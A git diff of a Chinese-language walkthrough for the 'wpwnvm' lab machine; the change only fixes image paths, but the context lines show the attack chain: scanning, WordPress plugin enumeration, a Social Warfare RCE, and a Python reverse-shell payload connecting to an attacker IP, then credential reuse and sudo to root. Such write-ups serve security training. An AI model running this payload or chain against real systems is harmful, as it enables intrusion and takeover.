@@ -48,7 +48,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
 ```
 这个靶机只有一个80和22端口开着, 那么入口就在网页端了
 ### Web信息枚举
-![Img](./FILES/wpwnvm/img-20220814173522.png)
+![Img](../FILES/wpwnvm/img-20220814173522.png)
 直接访问是一个建设中的页面
 <br>
 使用dirsearch查看一下可访问的
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
 [17:36:32] 200 -   27KB - /wordpress/
                                           
 ```
-![Img](./FILES/wpwnvm/img-20220814173742.png)
+![Img](../FILES/wpwnvm/img-20220814173742.png)
 robots.txt是一个fake的信息...
 <br>
 但是这是一个wordpress, 那直接上wpscan
@@ -114,11 +114,11 @@ i] User(s) Identified:
  | Confirmed By: Login Error Messages (Aggressive Detection)
 ```
 在上面使用wpscan的时候, 有一个100%命中的插件, social warfare, 那我们用searchspolit试试
-![Img](./FILES/wpwnvm/img-20220814175756.png)
+![Img](../FILES/wpwnvm/img-20220814175756.png)
 竟然是一个RCE, 拉下来查看一下代码
-![Img](./FILES/wpwnvm/img-20220814175833.png)
+![Img](../FILES/wpwnvm/img-20220814175833.png)
 path在wp-admin下面的post处, 那我们就直接根据漏洞的path来获取我们的shell
-![Img](./FILES/wpwnvm/img-20220814181711.png)
+![Img](../FILES/wpwnvm/img-20220814181711.png)
 ```
 <pre>system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.146.50",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'')</pre>
 ```
@@ -136,7 +136,7 @@ connect to [192.168.146.50] from (UNKNOWN) [192.168.146.65] 49886
 ```
 
 然后我们再用curl去访问本地, 这样我们就突破边界拿到了靶机的用户权限
-![Img](./FILES/wpwnvm/img-20220814182138.png)
+![Img](../FILES/wpwnvm/img-20220814182138.png)
 ## 提升权限
 ### 查看wordpress文件
 ```
@@ -186,11 +186,11 @@ define( 'DB_COLLATE', '' );
 
 ```
 然后我们来利用python获取可交互式的shell, 尝试使用这个密码登录另一个用户
-![Img](./FILES/wpwnvm/img-20220814182655.png)
+![Img](../FILES/wpwnvm/img-20220814182655.png)
 登录上来了!
 查看sudo -l, 发现这个用户可以执行所有的sudo权限.
-![Img](./FILES/wpwnvm/img-20220814182845.png)
+![Img](../FILES/wpwnvm/img-20220814182845.png)
 
 那就直接sudo su
-![Img](./FILES/wpwnvm/img-20220814182827.png)
+![Img](../FILES/wpwnvm/img-20220814182827.png)
 提权成功
